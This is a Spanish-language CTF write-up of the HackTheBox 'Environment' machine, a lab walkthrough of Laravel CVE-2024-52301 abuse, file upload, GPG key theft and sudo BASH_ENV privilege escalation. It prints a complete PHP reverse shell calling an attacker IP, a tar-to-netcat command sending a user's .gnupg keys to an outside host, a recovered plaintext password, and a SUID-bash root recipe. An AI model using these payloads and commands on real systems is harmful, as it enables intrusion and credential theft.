---
layout: post
title:  "Writeup Environment"
date:   2025-09-06
categories: [Writeup, HackTheBox]
tags: [linux, media]
image:
    path: /images/writeup-environment/Pasted image 20250906102501.png
---


***Dificultad: Media***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
la maquina «Environment» es de dificultad media y abarca desde el reconocimiento inicial para identificar puertos y servicios abiertos, hasta la explotación de una vulnerabilidad web del framework Laravel para obtener acceso inicial como www-data, captura de credenciales almacenadas en un archivo .gpg para pivotar a otro usuario del sistema (hish) y la escalada de privilegios a root mediante la manipulación de variables de entorno apoyandose tambien el la ejecucion de un binario como root (systeminfo).

---------------------
## Recon
primer escaneo con nmap:
```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 3000 10.129.237.134 -oN puertos
```

nos dice que hay 2 puertos abiertos:
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
```


segundo escaneo:
```bash
nmap -p22,80 -A -n -vvv 10.129.237.134 -oN objetivos
```

<img src="/images/writeup-environment/Pasted image 20250614162241.png" alt="image">
tenemos un domain name *http://environment.htb*
se agrega el /etc/hosts

enumerando un poco con feroxbuster:
<img src="/images/writeup-environment/Pasted image 20250614163735.png" alt="image">

en la pagina principal
<img src="/images/writeup-environment/Pasted image 20250614163638.png" alt="image">



en la pagina principal tenemos una pista:

<img src="/images/writeup-environment/Pasted image 20250614163619.png" alt="image">

tenemos una api tambien v1.1

normalmente en los ctfs, las apis estan en /api/v1 (o depende siempre de la version)

aunque haciendo un poco de fuzzing no tengo nada interesante
con feroxbuster:
```bash
feroxbuster -u http://environment.htb/api/v1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt  -n -x php,xml,txt,log
```


tambien hay un panel de inicio de session:
<img src="/images/writeup-environment/Pasted image 20250614171948.png" alt="image">



capturando las solicitudes del panel de inicio de sesión intentamos causar un error en la solicitud:
<img src="/images/writeup-environment/Pasted image 20250614175740.png" alt="image">

viendo esto y probando varias cosas, si cambiamos el remember o le damos un dato no booleano nos mostrara otro tipo de error:
<img src="/images/writeup-environment/Pasted image 20250619102707.png" alt="image">

tomando el código resultado, y analisando, tenemos una linea bastante interesante que no indica que si la app es *"preprod"* nos inicie automáticamente como el desarrollador:
```php
$keep_loggedin = False;
} elseif ($remember == 'True') {
    $keep_loggedin = True;
}

if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
}

if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
    $request->session()->regenerate();
    $request->session()->put('user_id', 1);
    return redirect('/management/dashboard');
}

$user = User::where('email', $email)->first();
```
## cve-2024-52301

y además, buscando vulnerabilidades para la versión de laravel, encontramos una, la cual tiene un nombre bastante curioso:

<img src="/images/writeup-environment/Pasted image 20250619162249.png" alt="image">

 esta vulnerabilidad nos dice que podemos manipular las variables de entorno de laravel, a través de solicitudes web (esto, junto con el nombre de la maquina y la evidencia, podemos ver cual puede ser el camino a seguir o el hilo a tirar)

el cve-2024-52301 
https://www.cybersecurity-help.cz/vdb/SB20241112127

tenemos un poc:
https://github.com/Nyamort/CVE-2024-52301

y se nos da un ejemplo que podemos probar:
<img src="/images/writeup-environment/Pasted image 20250619163537.png" alt="image">

 luego de algunas pruebas, nos funciona: 
 ```
 ?--env=argumento 
 ```
<img src="/images/writeup-environment/Pasted image 20250619163656.png" alt="image">
tenemos http://environment.htb/management/dashboard

con eso, copiamos los tokens "XSRF-TOKEN y LARABEL_SESSION" y los pegamos en el navegador, desde las herramientas de desarrollador 

si ahora entramos a la pagina:
<img src="/images/writeup-environment/Pasted image 20250619165307.png" alt="image">


finalmente tenemos un usuario:
<img src="/images/writeup-environment/Pasted image 20250619165338.png" alt="image">

y como veo la unica funcion de la pagina es para ver usuario suscritos y cambiar la foto de perfil, puede que esto sea para cargar una imagen maliciosa y lograr una shell inversa

## Shell como www-data

luego de probar, intento subir una webshell en php:
<img src="/images/writeup-environment/Pasted image 20250619180946.png" alt="image">

<img src="/images/writeup-environment/Pasted image 20250619180935.png" alt="image">
pero no permite ejecutar comandos complejos directamente desde la web shell solo cosas como id o whoami... (aunque de igual modo, nos confirma que este es el camino)


pero si cargamos una reverse shell en php obtenida de https://revshells.com:
```php
<?php
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.223', 6666);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

<img src="/images/writeup-environment/Pasted image 20250701214919.png" alt="image">
visitamos:
"http:\/\/environment.htb\/storage\/files\/3vil.php"
al mismo tiempo que estaremos en escucha por el puerto 6666 con netcat:
```bash
nc -lnvp 6666
```


tenemos nuestra revshell :D :
<img src="/images/writeup-environment/Pasted image 20250701215121.png" alt="image">

despues de buscar un poco, podemos ver que, en el directorio home, existe el nombre del usuario con el que entramos, y dentro, esta la primera flag:
<img src="/images/writeup-environment/Pasted image 20250701225626.png" alt="image">

mirando en el directorio, vemos que tiene un archivo .pgp, estos son archivos que ha sido encriptados por (PGP). esta herramienta para desencriptar, usa las keys que se encuentran en un directorio .gnupg en la home del usuario que intenta abrir el mensaje, si las claves coinciden, funcionará

## Shell como Hish
mirando esto, vamos a:

descargar el archivo .gpg en base 64 con:
```bash
cat keyvaul.gpg | base64
```

ya en nuestra maquina de atacante:
```bash
echo 'hQEMA7dVsO3Wz8/TAQf+IKbTZZO1EiVhMV0uQkniP/ndBBA2kIFWn5rjvZXGN9gmUan2davePkCM
p1G4+O9PEOg33wgyLhgL0hewJ8Uy2JaA2CQT6WCCk7YbHRPHCMNpChlgsGNCGgxmHi0WkrD6t0JJ
iPsJIly102O2UOrNoaCrUZuu1yBiswFkKPprXC6Z8ZasWTsRcsZCMSb6iRGjKVNaueaRMVP8l+6G
vxYgNhqE26YGjzfnkxEqbDT3RrWtQxfqBC4opt9Y2V/HwSRiJwDFeezNjogiaVNOD/TVVcapBsIN
QcvCwjzbB9Y6Pu1AovqgPildWWNUD+y97jVami7tLs+hY2kTRAjSt2G7htKdAfzI7cswCfkNvOIE
OYo/FFRndmk/qo7bXHsx/gC06YQZDass7GI+YTFWFPj00beezT5SBzV3wOg/yLuml4+ZGSyjSsHr
TIZECYQ6RFjjTWcKkVQfXL3fgMVk/OrKYEa65VoiNlJWa06Ay5XOdUT5fCwu8Ef87gjLAa8EYJZY
pd9fXVLCxKTHWzAJBRmtId2q8V+Lw4f0K2bbe/Wqpg==' | base64 -d > keyvault.gpg
```

luego de eso descargamos las keys que están en /home/hish/.gnupg (que será el usuario al que debemos pivotar)

para ello puedes hacer el mismo proceso con base64 o hacerlo con netcat

primero nos ponemos en escucha y todo lo recibido, los meteremos en un .tar:
```
nc -lnvp 6969 > gnupg.tar
```

y desde la maquina victima nos enviaremos todo el directorio de las keys
```
tar -cvf - /home/hish/.gnupg | nc 10.10.14.233 14464
```

ahora, gpg va a buscar las claves en nuestro home... pero ya tenemos unas alli, asi que después de descomprimir el archivo .tar o cambiar los archivos de base64 a su respectiva extensión, vamos a llevar la carpeta .gnupg a nuestro home

puedes mover o eliminar .gnupg de tu home o moverlo a tmp (*recuerda luego hacer el proceso a la inversa*):
```
mv ~/home/user/.gnupg /tmp
```

y mover la de hish a nuestro home:
```bash
mv /htb/environmet/home/hish/.gnupg ~/
```

ahora, estamos listos para desencriptar el archivo .pgp:
```bash
gpg --decrypt keyvault.gpg
```

y tenemos las claves de hish!:
<img src="/images/writeup-environment/Pasted image 20250702003609.png" alt="image">

finalmente nos podemos conectar por ssh dado que la otra shell es muy limitada y e inestable (se cierra la conexión teniendo que explotar de nuevo la subida maliciosa de la imagen)

ssh:
```bash
ssh hish@environment.htb
pass:marineSPm@ster!!
```

<img src="/images/writeup-environment/Pasted image 20250702003923.png" alt="image">

como siempre, ya que tenemos contraseña, podemos ver los programas o binarios que podemos ejecutar con privilegios:
```bash
sudo -l
```


<img src="/images/writeup-environment/Pasted image 20250702004141.png" alt="image">
como sudo, solo podemos ejecutar systeminfo!

algo interesante que vemos, es que tenemos una variable adicional (de nuevo variables de entorno, la maquina se deja ver :D )

<img src="/images/writeup-environment/Pasted image 20250702115518.png" alt="image">

tenemos algo llamado env_keep

que es esto?

al parecer es una opción o una funcionalidad de sudoesr para indicar cuales son las variables de entorno que se van a conservar después de ejecutar un comando con "sudo" siendo un usuario convencional (ya que normalmente se restablece el entorno al estado inicial) y esto indicaría cual no se cambiara 

hay un articulo que nos aclara un poco mas esto, el cual si buscamos en internet, será el primero que se nos muestre, se como manipular esa variable:
```
https://unix.stackexchange.com/questions/590788/treatment-of-env-and-bash-env-in-bash-running-in-bash-and-sh-mode
```
lo que se nos muestra, es que si creamos un archivo, y lo metemos dentro de la variable BASH_ENV la terminal lo ejecutara dado que asumirá que es como debe quedar el entorno después del uso de sudo

## Shell como Root

probando esto podemos crear un archivo en tmp:
```
id > /tmp/3viltest.sh
```

ahora, cambiamos ambas variables como indica el articulo:
```
ENV=/tmp/3viltest.sh BASH_ENV=/tmp/3viltest.sh
```

y ejecutamos sudo systeminfo, nada cambia..... pero ahora, si ejecutamos el comando y al mismo tiempo hacemos la el cambio del valor de las variables de entorno:
```bash
ENV=/tmp/3viltest.sh BASH_ENV=/tmp/3viltest.sh sudo systeminfo
```

tenemos:

<img src="/images/writeup-environment/Pasted image 20250702123536.png" alt="image">

que sudo ejecuta el script de nuestro entorno, incluso, haciendo pruebas, no es necesario siquiera manipular "ENV" podemos lograrlo manipulando solo la variable BASH_ENV:

<img src="/images/writeup-environment/Pasted image 20250702123815.png" alt="image">
<img src="/images/writeup-environment/Pasted image 20250702124020.png" alt="image">

aquí vemos como llevando la variable ENV valor / y solo manteniendo el valor de la otra variable sigue funcionando, diría que es un path hijaking

si haz visto mis writeups, sabrás que me encanta la técnica de convertir la bash a SUID, entonces aquí será igual :D

primero el script:
```
echo 'chmod u+s /bin/bash' > /tmp/3vil.sh
```

luego la manipulacion de la variable y la ejecucion de nuestro script:
```bash
BASH_ENV=/tmp/3vil.sh sudo systeminfo
```

y ahora verificando la bash:
<img src="/images/writeup-environment/Pasted image 20250702122317.png" alt="image">

ejecutando:
```bash
bash -p
```
somos root:

<img src="/images/writeup-environment/Pasted image 20250702124254.png" alt="image">

------------------------------------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">